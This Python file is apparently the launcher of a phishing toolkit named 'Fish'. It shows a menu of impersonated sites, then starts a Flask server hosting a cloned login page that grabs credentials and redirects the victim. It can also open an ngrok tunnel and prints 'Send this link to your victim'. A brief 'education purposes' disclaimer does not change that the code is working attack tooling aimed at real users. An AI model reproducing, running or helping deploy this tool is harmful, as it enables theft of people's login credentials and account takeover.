import zipfile
import sys
import time
import stat
import signal
import requests
import utils
import colorama
import os


from colorama import Fore, Back, Style
from os import system
from sys import platform
from threading import Thread
from sites import siteLookUp, siteDefaultRedirect
from pyngrok import ngrok


# Want to contribute? Make a fork and a pull request to the dev branch! I made the logo on placeit and converted into using https://www.text-image.com/convert/ascii.html. Thanks!! please star
ascii = """
                                                                              [[b]]NN
                                                                            [[b]]Ns[[blu]]sdN [[b]] N
                                                                            [[b]]hs[[blu]]ym  mmmm[[b]]NN
                                                                            [[b]]ys[[blu]]ym  mmNN  Nmm[[b]]NN
                                                                            [[b]]ys[[blu]]ym  mN [[g]] NN[[blu]]  mdmmm[[b]]NN
                                                                            [[b]]ys[[blu]]ym  mN [[g]] N [[blu]]  mdddddmmmNN
                                                                         [[b]]N  y[[blu]]sym   mmNNNmmddddmNNmddmmmN    myy[[b]]yd
                                                                     [[b]]N  N[[blu]]m  yshm   NmdddddddmmNN  mddddddmN Nd+`/[[b]]dN
                                                                    [[b]]NN[[blu]]NNNN  dhdm    mdddddddN [[w]] mN[[blu]]  mddd[[w]]sssyhmN m[[blu]]o-[[b]]-N
                                                                      [[b]]my[[blu]]ssh  NN  yN NdddddddN [[w]] mmN[[blu]]  mddh[[w]]sssssydN Ny[[blu]]yh[[b]]dm
                                                                       [[b]]my[[blu]]/.:shhs:`N Nmmmmmmm [[w]]  mmm[[blu]]  Nmdddy[[w]]sssssydN[[blu]] No[[b]].h
                                                                          [[b]]Nh[[blu]]+-    y  NNNNNN  [[w]] NmddN[[blu]] mdddddy[[w]]sssssymN[[blu]] h:[[b]]od
                                                                             [[b]]Nd[[blu]]o-`:NN      [[w]] NNmmmN[[blu]]   mdddddddhy[[w]]ssshmN[[blu]] m:[[b]]-N
                                                                                [[b]]Nd[[blu]]mmmmmNN           Nmdddddddddd[[w]]hyddmm[[blu]] N[[b]]hd
                                                                                  [[b]]Nm[[blu]]mmmmmmNNNNNNN  Nmmdddddddddddd[[w]]yyydmm[[blu]][[b]] hy
                                                                                   [[b]]NN[[blu]]NNNNNNNNNN  dmNmmmmmmmmmdddddy[[w]]sshdmN[[b]] N
                                                                                         [[b]]NN[[blu]]NNNdy/+m  [[w]] NNNNN[[blu]] Nmdddddhyddd[[b]]mN
                                                                                        [[b]]m/[[blu]]::--.`y [[w]] NN Nhs+/y[[blu]]  mddddddddd[[b]]dm
                                                                                         [[b]]md[[blu]]o`   :d[[w]] d//shmNmN[[blu]] Nddddddddddd[[b]]dm
                                                                                            [[b]]h-  [[blu]] `sNNhsohN[[blu]]  Nmdddddddddddd[[b]]dN
                                                                                             Ns[[blu]].  [[w]] -/syyyosN[[blu]] Nmmddddddddddd[[b]]N[[blu]]==[[b]]N
                                                                                              [[w]]NNs-[[blu]]  [[w]] `````[[blu]] .sm NNmmmddddddd[[b]]m[[blu]]p/+[[]b]d
                                                                                              [[w]]ysmNh/`[[blu]]        `/sdN Nmdddddd[[b]]m[[blu]]`/:[[b]]`y
                                                                                              [[w]]N:.y[[blu]]  my/.`        .s  mddddd[[b]]m[[blu]]\`/:[[b]] `d
                                                                                               [[w]]NoN[[blu]]     Nhs/.`      ymmddddd[[b]]m[[blu]]p;/"[[b]]` /
                                                                                                            [[b]]mh[[blu]]-   `-+NNNmdd[[b]]m[[blu]]p:-`[[b]]/-
                                                                                                         [[b]]Nm[[blu]]NNNhoohm NN  mdd[[b]]N[[blu]]m`=[[b]]`/
                                                                                                          [[b]]mm[[blu]]NN  m  m-N Ndd[[b]]m[[blu]]\`/`[[b]]-m
                                                                                                          [[b]]NN[[blu]]   d/  -o  md[[b]]m[[blu]]--d+o[[b]]hN
                                                                                                            [[b]]d  +[[blu]]y h d Nmm
                                                                                                           [[b]]o   /[[blu]]d s`m NN
                                                                                                          [[b]]m. d[[blu]] yy d`o
                                                                                                       [[b]]Nh[[blu]] m:/  y  yN
                                                                                                        [[b]]s:[[blu]]sN hy
                                                                                        [[w]]NdN           [[blu]]N
                                                                                         [[w]]do/+ooss[[c]]yydm

[[c]]                 _____ _                                                    _                           _                 _       _               _     _     _     _               _              _
[[c]]                |_   _| |                               ___                | |                         | |               | |     | |             | |   (_)   | |   (_)             | |            | |
[[c]]                  | | | |__   ___    ___  _ __   ___   ( _ )     ___  _ __ | |_   _   _   _ _ __ ______| |_ ___ ______ __| | __ _| |_ ___   _ __ | |__  _ ___| |__  _ _ __   __ _  | |_ ___   ___ | |
[[c]]                  | | | '_ \ / _ \  / _ \| '_ \ / _ \  / _ \/\  / _ \| '_ \| | | | | | | | | '_ \______| __/ _ \______/ _` |/ _` | __/ _ \ | '_ \| '_ \| / __| '_ \| | '_ \ / _` | | __/ _ \ / _ \| |
[[c]]                  | | | | | |  __/ | (_) | | | |  __/ | (_>  < | (_) | | | | | |_| | | |_| | |_) |     | || (_) |    | (_| | (_| | ||  __/ | |_) | | | | \__ \ | | | | | | | (_| | | || (_) | (_) | |
[[c]]                  \_/ |_| |_|\___|  \___/|_| |_|\___|  \___/\/  \___/|_| |_|_|\__, |  \__,_| .__/       \__\___/      \__,_|\__,_|\__\___| | .__/|_| |_|_|___/_| |_|_|_| |_|\__, |  \__\___/ \___/|_|
[[c]]                                                                               __/ |       | |                                             | |                               __/ |
[[c]]                                                                              |___/        |_|                                             |_|                              |___/
[[y]] Made by aarav2you
[[y]] Made by Kritagyaispro

[[c-bg]]_,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.- [[:: FISH ::]] '~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~"""
                                    ############################################################# Parameters and configuration #############################################################
# We aren't responsible for anything you decide to do. This is only for education purposes.

#### Initializes colorama
colorama.init(autoreset=True)

#### Detects SIGINT
def signal_handler(sig, frame):
    print(Fore.RED + '\nExiting...(You pressed Ctrl+C)')
    exit(0)

if __name__ == "__main__":
    signal.signal(signal.SIGINT, signal_handler)

#### Detects the Operating System
if platform in ('linux', 'linux2', 'darwin'):
    from commands import unixCommands as commands
    python_cmd = "python3"
elif platform == "win32":
    from commands import windowsCommands as commands
    python_cmd = "python"
else:
    raise LookupError("Unable to detect operating system! Please file a bug report at https://github.com/aarav2you/Fish/issues/new?assignees=&labels=bug&template=bug_report.md&title=")

#### Starts ngrok tunnel utilizing pyngrok
def start_ngrok(port):
    http_tunnel = ngrok.connect(port, "http")
    print(Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.GREEN + " Send this link to your victim: " + Fore.CYAN + http_tunnel.public_url.replace("http" , "https"))
    ngrok_process = ngrok.get_ngrok_process()
    ngrok_process.proc.wait()


#### Clears terminal and prints ASCII art
os.system(commands.clear)
print(utils.color.colorText(ascii))

#### Splits into sites into seperate lines from sites.py
def split_block(lst, se):
    if not len(lst)%se==0:
        for index in range(len(lst)):
            lst.append("arb")
    sublists=[]
    to_split = []
    
    for index in range(len(lst)+1):
        if index%se==0:
            to_split.append(index)
    for index in range(len(to_split)-1):
        sublists.append(lst[to_split[index]:to_split[index+1]])
    final = []
    
    for index in sublists:
        if "arb" in index:
            while 'arb' in index:
                index.remove("arb")
        if not index==[]:
            final.append(index)
    return final
    
for site in split_block(list(siteLookUp.keys()), 2): 
    for number in site:

#### Clears the console and prints the ASCII art
        print(Fore.RED + "[" + Fore.CYAN + str(number) + Fore.RED + "]" + Fore.BLUE + f" {siteLookUp[number]}" , end="                ")
    print("\n")


                                    ############################################################# Questions/ Input #############################################################
#### Selects the site to create a phishing page for (currently Outlook)
try:
    site = int(input(Fore.RED + "[" + Fore.YELLOW + "*" + Fore.RED + "]" + Fore.GREEN + " Choose an option: "))
except (ValueError, TypeError) as error:
    print(Fore.RED + '\nExiting...(You pressed Ctrl+C)')
#### Selects the vicitim would be redirected to after the credientials are grabbed
redirect_url = input(Fore.RED + "[" + Fore.YELLOW + "*" + Fore.RED + "]" + Fore.GREEN + " Enter redirect url:" + Fore.YELLOW + f" ({siteDefaultRedirect[site]})" + Fore.GREEN + ": ") or siteDefaultRedirect[site]
   

#### Selects the host to run the flask server to run on, you can use private IP to be available in LAN
host = input(Fore.RED + "[" + Fore.YELLOW + "*" + Fore.RED + "]" + Fore.GREEN + " Flask server host" + Fore.YELLOW + " (localhost)" + Fore.GREEN + ": ") or "localhost"

#### Selects the port for flask server to run on
port = input(Fore.RED + "[" + Fore.YELLOW + "*" + Fore.RED + "]" + Fore.GREEN + " Flask server port" + Fore.YELLOW + " (49467)" + Fore.GREEN + ": ") or 49467

#### Determines to use ngrok or not
ngrok_use = input(Fore.RED + "[" + Fore.YELLOW + "*" + Fore.RED + "]" + Fore.GREEN + " Use nGrok?" + Fore.YELLOW + " (y/n)" + Fore.GREEN + ": ") or "y"

#### Tells flask to display HTTP requests or not
display_reqs = input(Fore.RED + "[" + Fore.YELLOW + "*" + Fore.RED + "]" + Fore.GREEN + " Display HTTP requests? (not reccomended)" + Fore.YELLOW + " (y/n)" + Fore.GREEN + ": ") or "n"

#### Tells user if its starting server
print("\n" + Fore.RED + "[" + Fore.BLUE + "*" + Fore.RED + "]" + Fore.GREEN + " Starting flask server...")

                                     ############################################################# Execution #############################################################

#### Executes app.py
def exec(site):
    time.sleep(2)
    print("\n")
    try:
        siteName = siteLookUp[site]
    except KeyError:
        raise LookupError("Error! Please file a bug report at https://github.com/aarav2you/Fish/issues/new?assignees=&labels=bug&template=bug_report.md&title")

    #Using this instead of a string to be more portable and possibly prevent issues
    os.system(f"{python_cmd} {os.path.join('Sites', siteName, 'app.py')} {redirect_url} {host} {port} {siteName} {display_reqs}")

#### Detects if ngrok is being used and executes it
if ngrok_use=="y":
    Thread(target=start_ngrok, args=(port, )).start()
    Thread(target=exec, args=(site, )).start()
else:
    Thread(target=exec, args=(site, )).start()